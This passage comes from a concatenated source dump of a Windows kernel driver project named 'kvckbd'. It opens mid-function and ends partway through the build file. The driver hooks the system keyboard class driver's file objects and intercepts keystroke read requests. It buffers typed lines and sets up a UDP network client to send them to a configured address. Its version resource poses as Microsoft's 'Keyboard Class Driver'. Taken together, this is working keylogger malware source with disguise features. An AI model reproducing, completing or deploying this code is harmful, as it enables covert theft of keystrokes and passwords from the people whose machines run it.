        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        //
        // Complete the original IRP
        //
        IoCompleteRequest(OriginalIrp, IO_KEYBOARD_INCREMENT);
    }
    else
    {
        //
        // Mark as safe to unload
        //
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        IoCompleteRequest(OriginalIrp, IO_NO_INCREMENT);
    }
    
Exit:
    
    PsTerminateSystemThread(Status);
}

/*++

Routine: KbdIrp_Read

Description:
    Handles IRP_MJ_READ requests by intercepting keyboard input data,
    processing it, and forwarding to the original keyboard device.

Arguments:
    DeviceObject    - Pointer to our filter device object
    Irp             - Pointer to the I/O request packet

Return Value:
    STATUS_PENDING if operation is asynchronous, otherwise appropriate NTSTATUS.

--*/
NTSTATUS
KbdIrp_Read(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION IrpStack;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    PLIST_ENTRY ListEntry;
    HANDLE ThreadHandle = NULL;

    UNREFERENCED_PARAMETER(DeviceObject);

    IrpStack = IoGetCurrentIrpStackLocation(Irp);

    //
    // Validate read parameters
    //
    if (IrpStack->Parameters.Read.Length == 0)
    {
        Status = STATUS_SUCCESS;
    }
    else if (IrpStack->Parameters.Read.Length % sizeof(KEYBOARD_INPUT_DATA))
    {
        Status = STATUS_BUFFER_TOO_SMALL;
    }
    else
    {
        //
        // We only allow a trusted subsystem with the appropriate privilege
        // level to execute a Read call.
        //
        Status = STATUS_PENDING;
    }

    //
    // If status is pending, mark the packet pending and start the packet
    // in a cancellable state. Otherwise, complete the request.
    //
    Irp->IoStatus.Status = Status;
    Irp->IoStatus.Information = 0;

    if (Status == STATUS_PENDING)
    {
        IoSetCancelRoutine(Irp, KbdIrp_Cancel);

        if (Irp->Cancel)
        {
            Status = STATUS_CANCELLED;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto Exit;
        }

        //
        // Update keyboard object state
        //
        ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;

        while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
        {
            KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);

            if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
            {
                ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
                KeyboardObject->SafeUnload = FALSE;
                ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
                break;
            }

            ListEntry = ListEntry->Flink;
        }

        IoMarkIrpPending(Irp);

        //
        // Create system thread to handle the read operation
        //
        Status = PsCreateSystemThread(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            NULL,
            NULL,
            NULL,
            KbdThread_HandleRead,
            Irp);
        
        if (!NT_SUCCESS(Status))
        {
            KBD_ERROR("PsCreateSystemThread KbdThread_HandleRead failed: 0x%08X", Status);
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto Exit;
        }

        if (ThreadHandle != NULL)
        {
            ZwClose(ThreadHandle);
            ThreadHandle = NULL;
        }

        return STATUS_PENDING;
    }
    else
    {
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }

Exit:
    return Status;
}

/*++

Routine: KbdDriver_DequeueRead

Description:
    Dequeues the next available read IRP regardless of FileObject

Assumptions:
    DeviceExtension->SpinLock is already held (so no further sync is required).

Arguments:
    DeviceExtension - Pointer to keyboard device extension

Return Value:
    Pointer to dequeued IRP, or NULL if queue is empty.

--*/
PIRP
KbdDriver_DequeueRead(
    _In_ PCHAR DeviceExtension
)
{
    ASSERT(DeviceExtension != NULL);

    PIRP NextIrp = NULL;
    LIST_ENTRY* ReadQueue = (LIST_ENTRY*)(DeviceExtension + READ_QUEUE_OFFSET_DE);

    while (!NextIrp && !IsListEmpty(ReadQueue))
    {
        PDRIVER_CANCEL OldCancelRoutine;
        PLIST_ENTRY ListEntry = RemoveHeadList(ReadQueue);

        //
        // Get the next IRP off the queue and clear the cancel routine
        //
        NextIrp = CONTAINING_RECORD(ListEntry, IRP, Tail.Overlay.ListEntry);
        OldCancelRoutine = IoSetCancelRoutine(NextIrp, NULL);

        //
        // IoCancelIrp() could have just been called on this IRP.
        // What we're interested in is not whether IoCancelIrp() was called
        // (ie, NextIrp->Cancel is set), but whether IoCancelIrp() called (or
        // is about to call) our cancel routine. To check that, check the result
        // of the test-and-set macro IoSetCancelRoutine.
        //
        if (OldCancelRoutine)
        {
            //
            // Cancel routine not called for this IRP. Return this IRP.
            //
            /*ASSERT(OldCancelRoutine == KeyboardClassCancel);*/
        }
        else
        {
            //
            // This IRP was just cancelled and the cancel routine was (or will
            // be) called. The cancel routine will complete this IRP as soon as
            // we drop the spinlock. So don't do anything with the IRP.
            //
            // Also, the cancel routine will try to dequeue the IRP, so make the
            // IRP's listEntry point to itself.
            //
            //ASSERT(NextIrp->Cancel);
            InitializeListHead(&NextIrp->Tail.Overlay.ListEntry);
            NextIrp = NULL;
        }
    }

    return NextIrp;
}

/*++

Routine: KbdThread_IrpHookInit

Description:
    System thread that initializes IRP hooking for keyboard devices.
    This thread periodically scans for new keyboard devices and hooks them.

Arguments:
    StartContext - Unused parameter

Return Value:
    None. Thread terminates via PsTerminateSystemThread.

--*/
VOID
KbdThread_IrpHookInit(
    _In_ PVOID StartContext
)
{
    UNREFERENCED_PARAMETER(StartContext);

    NTSTATUS Status = STATUS_SUCCESS;
    PDEVICE_OBJECT KbdDeviceObject = NULL;
    PLIST_ENTRY ListEntry;
    PCHAR KbdDeviceExtension = NULL;
    PIO_REMOVE_LOCK RemoveLock = NULL;
    PKSPIN_LOCK SpinLock = NULL;
    KIRQL Irql;
    PIRP Irp = NULL;
    PIO_STACK_LOCATION IrpStack;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    HANDLE ThreadHandle = NULL;
    LARGE_INTEGER Interval;

    //
    // Initialize delay interval (100ms)
    //
    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL;

    while (!((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading)
    {
        KbdDeviceObject = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject->DeviceObject;

        while (KbdDeviceObject != NULL)
        {
            //
            // Check if we already have a keyboard object for this device
            //
            ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;
            KeyboardObject = NULL;

            while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
            {
                KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);

                if (KeyboardObject->KbdDeviceObject == KbdDeviceObject)
                {
                    break;
                }

                ListEntry = ListEntry->Flink;
            }

            if (KeyboardObject != NULL && KeyboardObject->KbdDeviceObject == KbdDeviceObject)
            {
                KbdDeviceObject = KbdDeviceObject->NextDevice;
                continue;
            }

            KbdDeviceExtension = KbdDeviceObject->DeviceExtension;
            RemoveLock = (PIO_REMOVE_LOCK)(KbdDeviceExtension + REMOVE_LOCK_OFFSET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            //
            // Dequeue a read IRP from the keyboard device
            //
            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            if (Irp == NULL)
            {
                KbdDeviceObject = KbdDeviceObject->NextDevice;
                continue;
            }

            IoSetCancelRoutine(Irp, KbdIrp_Cancel);

            IrpStack = IoGetCurrentIrpStackLocation(Irp);

            //
            // Create new keyboard object
            //
            KeyboardObject = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KBDDRIVER_KEYBOARD_OBJECT), KBDDRIVER_POOL_TAG);

            if (KeyboardObject == NULL)
            {
                KBD_ERROR("ExAllocatePool2 KeyboardObject failed");
                Status = STATUS_INSUFFICIENT_RESOURCES;
                goto Cleanup;
            }

            RtlZeroMemory(KeyboardObject, sizeof(KBDDRIVER_KEYBOARD_OBJECT));

            //
            // Initialize keyboard object
            //
            KeyboardObject->SafeUnload = FALSE;
            KeyboardObject->RemoveLockIrp = Irp;
            KeyboardObject->KbdFileObject = IrpStack->FileObject;
            KeyboardObject->BttmDeviceObject = IrpStack->FileObject->DeviceObject;
            KeyboardObject->KbdDeviceObject = KbdDeviceObject;

            KeInitializeEvent(&KeyboardObject->Event, SynchronizationEvent, FALSE);
            ExInitializeResourceLite(&KeyboardObject->Resource);

            //
            // Hook the file object to point to our device
            //
            KeyboardObject->KbdFileObject->DeviceObject = g_FilterDeviceObject;

            //
            // Update stack size
            //
            g_FilterDeviceObject->StackSize = max(KeyboardObject->BttmDeviceObject->StackSize, g_FilterDeviceObject->StackSize);

            //
            // Add keyboard object to global list
            //
            ExInterlockedInsertTailList(
                &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead,
                &KeyboardObject->ListEntry,
                &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

            KeyboardObject->InitSuccess = TRUE;

            KBD_INFO("Keyboard object created: Filter=%p, Keyboard=%p, Bottom=%p, File=%p",
                g_FilterDeviceObject,
                KeyboardObject->KbdDeviceObject,
                KeyboardObject->BttmDeviceObject,
                KeyboardObject->KbdFileObject);

            //
            // Create thread to handle the read operation
            //
            Status = PsCreateSystemThread(
                &ThreadHandle,
                THREAD_ALL_ACCESS,
                NULL,
                NULL,
                NULL,
                KbdThread_HandleRead,
                Irp);

            if (!NT_SUCCESS(Status))
            {
                KBD_ERROR("PsCreateSystemThread KbdThread_HandleRead failed: 0x%08X", Status);
                goto Cleanup;
            }

            if (ThreadHandle != NULL)
            {
                ZwClose(ThreadHandle);
                ThreadHandle = NULL;
            }

            KbdDeviceObject = KbdDeviceObject->NextDevice;
            continue;

        Cleanup:
            if (!NT_SUCCESS(Status) && KeyboardObject != NULL)
            {
                if (!KeyboardObject->InitSuccess)
                {
                    if (KeyboardObject->KbdFileObject->DeviceObject != KeyboardObject->BttmDeviceObject)
                    {
                        KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
                    }

                    ExDeleteResourceLite(&KeyboardObject->Resource);
                    ExFreePoolWithTag(KeyboardObject, KBDDRIVER_POOL_TAG);
                }
            }

            if (!NT_SUCCESS(Status) && Irp != NULL)
            {
                Irp->IoStatus.Status = 0;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
            }

            KbdDeviceObject = KbdDeviceObject->NextDevice;
        }

        KeDelayExecutionThread(KernelMode, FALSE, &Interval);
    }

    PsTerminateSystemThread(Status);
}

/*++

Routine: KbdDriver_CleanupKeyboardObjects

Description:
    Cleans up all keyboard objects during driver unload.
    Ensures all resources are properly released and devices are restored.

Arguments:
    None.

Return Value:
    None.

--*/
VOID
KbdDriver_CleanupKeyboardObjects(
    VOID
)
{
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    PLIST_ENTRY ListEntry;
    PCHAR KbdDeviceExtension;
    PIO_REMOVE_LOCK RemoveLock;
    PKSPIN_LOCK SpinLock;
    KIRQL Irql;
    PIRP Irp;
    LARGE_INTEGER Interval;

    //
    // Initialize delay interval (100ms)
    //
    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL;

    while (!IsListEmpty(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead))
    {
        ListEntry = ExInterlockedRemoveHeadList(
            &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead,
            &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

        KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);

        if (!KeyboardObject->IrpCancel)
        {
            KbdDeviceExtension = KeyboardObject->KbdDeviceObject->DeviceExtension;
            RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFSET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            //
            // Dequeue any pending IRP
            //
            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            //
            // Restore original device object
            //
            KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;

            if (Irp != NULL)
            {
                Irp->IoStatus.Status = 0;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
            }

            //
            // Wait for safe unload
            //
            while (!KeyboardObject->SafeUnload)
            {
                KeDelayExecutionThread(KernelMode, FALSE, &Interval);
            }

            KBD_INFO("Safe to unload: Filter=%p, Keyboard=%p, Bottom=%p, File=%p",
                g_FilterDeviceObject,
                KeyboardObject->KbdDeviceObject,
                KeyboardObject->BttmDeviceObject,
                KeyboardObject->KbdFileObject);
        }
        else
        {
            KBD_INFO("Device has been removed: Filter=%p, Keyboard=%p",
                g_FilterDeviceObject, KeyboardObject);
        }

        //
        // Cleanup resources
        //
        ExDeleteResourceLite(&KeyboardObject->Resource);

        if (KeyboardObject != NULL)
        {
            ExFreePoolWithTag(KeyboardObject, KBDDRIVER_POOL_TAG);
            KeyboardObject = NULL;
        }
    }

    //
    // Additional delay to ensure cleanup completion
    //
    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
}

/*++

Routine: KbdDriver_Unload

Description:
    Driver unload routine. Cleans up all resources and unhooks all devices.

Arguments:
    DriverObject - Pointer to the driver object

Return Value:
    None.

--*/
VOID 
KbdDriver_Unload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);

    KBD_INFO("Starting driver unload");

    //
    // Signal unloading to all threads
    //
    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading = TRUE;

    //
    // Cleanup all keyboard objects
    //
    KbdDriver_CleanupKeyboardObjects();
	
	//
	// Flush any remaining buffered lines
	//
	KbdHandler_FlushBuffer();

    //
    // Cleanup network resources
    //
    NetClient_Cleanup();
    WSKCleanup();

    //
    // Release driver object reference
    //
    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject != NULL)
    {
        ObDereferenceObject(((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject);
        ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject = NULL;
    }

    //
    // Delete our device object
    //
    if (g_FilterDeviceObject != NULL)
    {
        IoDeleteDevice(g_FilterDeviceObject);
        g_FilterDeviceObject = NULL;
    }

    KBD_INFO("Driver unload completed");
}

/*++

Routine: DriverEntry

Description:
    DriverEntry initializes the driver and is the first routine called by the
    system after the driver is loaded. DriverEntry specifies the other entry
    points in the function driver, such as EvtDevice and DriverUnload.

Parameters Description:

    DriverObject - represents the instance of the function driver that is loaded
    into memory. DriverEntry must initialize members of DriverObject before it
    returns to the caller. DriverObject is allocated by the system before the
    driver is loaded, and it is released by the system after the system unloads
    the function driver from memory.

    RegistryPath - represents the driver specific path in the Registry.
    The function driver can use the path to store driver related data between
    reboots. The path does not store hardware instance specific data.

Return Value:

    STATUS_SUCCESS if successful,
    STATUS_UNSUCCESSFUL otherwise.

--*/
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS Status = STATUS_SUCCESS;
    UNICODE_STRING DriverName;
    PDRIVER_OBJECT KbdDriverObject = NULL;
    WSKDATA WSKData;
    HANDLE ThreadHandle = NULL;

    KBD_INFO("Starting driver initialization");

    //
    // Create our filter device object
    //
    RtlInitUnicodeString(&DriverName, L"\\Karlann");

    Status = IoCreateDevice(
        DriverObject,
        KBDDRIVER_MAX_DEVICE_EXTENSION,
        &DriverName,
        FILE_DEVICE_KEYBOARD,
        0,
        FALSE,
        &g_FilterDeviceObject);

    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("IoCreateDevice failed: 0x%08X", Status);
        goto Cleanup;
    }

    g_FilterDeviceObject->Flags |= DO_BUFFERED_IO;

    //
    // Get reference to kbdclass driver object
    //
    RtlInitUnicodeString(&DriverName, L"\\Driver\\Kbdclass");

    Status = ObReferenceObjectByName(
        &DriverName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        FILE_ALL_ACCESS,
        *IoDriverObjectType,
        KernelMode,
        NULL,
        &KbdDriverObject);

    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("ObReferenceObjectByName %wZ failed: 0x%08X", &DriverName, Status);
        goto Cleanup;
    }

    //
    // Initialize device extension
    //
    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject = KbdDriverObject;
    InitializeListHead(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead);
    KeInitializeSpinLock(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

    //
    // Set up driver dispatch routines
    //
    DriverObject->MajorFunction[IRP_MJ_READ] = KbdIrp_Read;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KbdIrp_DeviceControl;
    DriverObject->DriverUnload = KbdDriver_Unload;

    //
    // Initialize WSK networking
    //
    Status = WSKStartup(MAKE_WSK_VERSION(1, 0), &WSKData);

	if (!NT_SUCCESS(Status))
	{
		KBD_ERROR("WSKStartup failed: 0x%08X", Status);
		goto Cleanup;
	}

	Status = NetClient_Initialize(
		KBDDRIVER_REMOTE_IP,
		KBDDRIVER_REMOTE_PORT,
		AF_INET, 
		SOCK_DGRAM);

	if (!NT_SUCCESS(Status))
	{
		KBD_ERROR("NetClient_Initialize failed: 0x%08X", Status);
		goto Cleanup;
	}

	//
	// Initialize keyboard line buffer
	//
	KbdHandler_InitializeBuffer();

    //
    // Start IRP hooking thread
    //
    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        KbdThread_IrpHookInit,
        NULL);

    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("PsCreateSystemThread KbdThread_IrpHookInit failed: 0x%08X", Status);
        goto Cleanup;
    }

    if (ThreadHandle != NULL)
    {
        ZwClose(ThreadHandle);
        ThreadHandle = NULL;
    }

    KBD_INFO("Driver initialization completed successfully");
    return STATUS_SUCCESS;

Cleanup:
    if (ThreadHandle != NULL)
    {
        ZwClose(ThreadHandle);
    }

    if (KbdDriverObject != NULL)
    {
        ObDereferenceObject(KbdDriverObject);
    }

    if (g_FilterDeviceObject != NULL)
    {
        IoDeleteDevice(g_FilterDeviceObject);
        g_FilterDeviceObject = NULL;
    }

    KBD_ERROR("Driver initialization failed: 0x%08X", Status);
    return Status;
}


================================================================================
 FILE: kvckbd\driver.h
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-09 10:13:26
 File size     : 3.38 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

/*++

Module Name:
    driver.h

Abstract:
    Common definitions, structures, and declarations for the keyboard
    filter driver. This header provides the core infrastructure for
    intercepting and processing keyboard input data.

Environment:
    Kernel mode only.

--*/

#pragma once

//
// System Headers
//
#include <ntifs.h>
#include <ntddk.h>
#include <ntddkbd.h>

//
// External References
//
extern POBJECT_TYPE* IoDriverObjectType;

//
// Architecture-Specific Offsets into KBDCLASS Device Extension
//
#ifdef _WIN64
    #define KBDCLASS_REMOVELOCK_OFFSET      0x20
    #define KBDCLASS_SPINLOCK_OFFSET        0xA0
    #define KBDCLASS_READQUEUE_OFFSET       0xA8
#else
    #define KBDCLASS_REMOVELOCK_OFFSET      0x10
    #define KBDCLASS_SPINLOCK_OFFSET        0x6C
    #define KBDCLASS_READQUEUE_OFFSET       0x70
#endif

//
// Debug output - compiled out in Release builds
//
#ifdef DBG
    #define KBDTRACE_ROUTINES               0x00000001
    #define KBDTRACE_OPERATION_STATUS       0x00000002
    
    const static ULONG gTraceFlags = KBDTRACE_ROUTINES | KBDTRACE_OPERATION_STATUS;
    
    #define KBD_DBG_PRINT(_level, _string)  \
        (FlagOn(gTraceFlags, (_level)) ?    \
            DbgPrint _string :              \
            ((int)0))
    
    #define KBD_ERROR(_fmt, ...)    DbgPrint("KBD ERROR: " _fmt "\n", __VA_ARGS__)
    #define KBD_INFO(_fmt, ...)     DbgPrint("KBD INFO: " _fmt "\n", __VA_ARGS__)
#else
    #define KBD_DBG_PRINT(_level, _string)  ((void)0)
    #define KBD_ERROR(_fmt, ...)            ((void)0)
    #define KBD_INFO(_fmt, ...)             ((void)0)
#endif

//
// Pool Tag for Memory Allocations
//
#define KBDDRIVER_POOL_TAG      'dbKK'

//
// Network Configuration
//
#define KBDDRIVER_REMOTE_IP         L"127.0.0.1"
#define KBDDRIVER_REMOTE_PORT       L"31415"

//
// Driver Structures
//

typedef struct _KBDDRIVER_KEYBOARD_OBJECT
{
    LIST_ENTRY          ListEntry;
    
    BOOLEAN             InitSuccess;
    BOOLEAN             SafeUnload;
    BOOLEAN             IrpCancel;
    
    PIRP                NewIrp;
    PIRP                RemoveLockIrp;
    
    KEVENT              Event;
    
    PFILE_OBJECT        KbdFileObject;
    PDEVICE_OBJECT      BttmDeviceObject;
    PDEVICE_OBJECT      KbdDeviceObject;
    
    ERESOURCE           Resource;
    
} KBDDRIVER_KEYBOARD_OBJECT, *PKBDDRIVER_KEYBOARD_OBJECT;

typedef struct _KBDDRIVER_DEVICE_EXTENSION
{
    KSPIN_LOCK          KbdObjSpinLock;
    LIST_ENTRY          KbdObjListHead;
    
    PDRIVER_OBJECT      KbdDriverObject;
    
    BOOLEAN             IsUnloading;
    
} KBDDRIVER_DEVICE_EXTENSION, *PKBDDRIVER_DEVICE_EXTENSION;

//
// Function Declarations
//

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
);

VOID 
KbdDriver_Unload(
    _In_ PDRIVER_OBJECT DriverObject
);

NTSTATUS
ObReferenceObjectByName(
    _In_     PUNICODE_STRING    ObjectName,
    _In_     ULONG              Attributes,
    _In_opt_ PACCESS_STATE      AccessState,
    _In_opt_ ACCESS_MASK        DesiredAccess,
    _In_     POBJECT_TYPE       ObjectType,
    _In_     KPROCESSOR_MODE    AccessMode,
    _Inout_opt_ PVOID           ParseContext,
    _Out_    PVOID*             Object
);

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#endif


================================================================================
 FILE: kvckbd\kvckbd.rc
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-06 20:44:32
 File size     : 1.93 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// Minimal resource file for driver version info
#include <winres.h>

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 10,0,26200,8460
 PRODUCTVERSION 10,0,26200,8460
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x3L
 FILESUBTYPE 0x7L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "Microsoft Corporation"
            VALUE "FileDescription", "Keyboard Class Driver"
            VALUE "FileVersion", "10.0.26200.8460"
            VALUE "InternalName", "kvckbd.sys"
            VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "kvckbd.sys"
            VALUE "ProductName", "Microsoft® Windows® Operating System"
            VALUE "ProductVersion", "10.0.26200.8460"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END


================================================================================
 FILE: kvckbd\kvckbd.vcxproj
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-09 09:23:40
 File size     : 5.68 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{5FE21A14-07A7-A05B-498A-6201D58BE337}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">x64</Platform>
    <RootNamespace>kvckbd</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <IncludePath>$(IncludePath);$(WDKContentRoot)Include\$(TargetOS)\km;$(WDKContentRoot)Include\shared;$(WindowsSdkDir)Include\$(WindowsTargetPlatformVersion)\um;$(WindowsSdkDir)Include\$(WindowsTargetPlatformVersion)\shared</IncludePath>
    <LibraryPath>$(LibraryPath);$(WDKContentRoot)lib\$(TargetOS)\km\$(TargetArch)</LibraryPath>
    <IntDir>x64\Release\obj\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
    <Link>
      <AdditionalDependencies>network\network.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <TreatLinkerWarningAsErrors>false</TreatLinkerWarningAsErrors>
    </Link>
    <ClCompile>
      <DebugInformationFormat>None</DebugInformationFormat>
      <TreatWarningAsError>false</TreatWarningAsError>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemGroup>
    <Inf Include="kvckbd.inf" />
  </ItemGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="scancode.c" />
    <ClCompile Include="driver.c" />
    <ClCompile Include="network.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="driver.h" />
    <ClInclude Include="scancode.h" />
    <ClInclude Include="network.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="kvckbd.rc" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
  <!-- CZYSZCZENIE DOPIERO PO PEŁNEJ KOMPILACJI -->
  <Target Name="FinalCleanup" AfterTargets="Build">
    <PropertyGroup>
      <ReleaseDir>$(ProjectDir)x64\Release</ReleaseDir>
    </PropertyGroup>
    <Message Text="=== FINAL CLEANUP STARTED ===" Importance="high" />
    <!-- Poczekaj aż wszystkie pliki będą gotowe -->
    <Exec Command="ping -n 3 127.0.0.1 &gt; nul" IgnoreExitCode="true" />
    <!-- Usuń tylko śmieci z głównego folderu Release -->
    <ItemGroup>
      <JunkFiles Include="$(ReleaseDir)\*.sys" />
      <JunkFiles Include="$(ReleaseDir)\*.inf" />
      <JunkFiles Include="$(ReleaseDir)\*.cat" />
      <JunkFiles Include="$(ReleaseDir)\*.cer" />
      <JunkFiles Include="$(ReleaseDir)\*.pdb" />
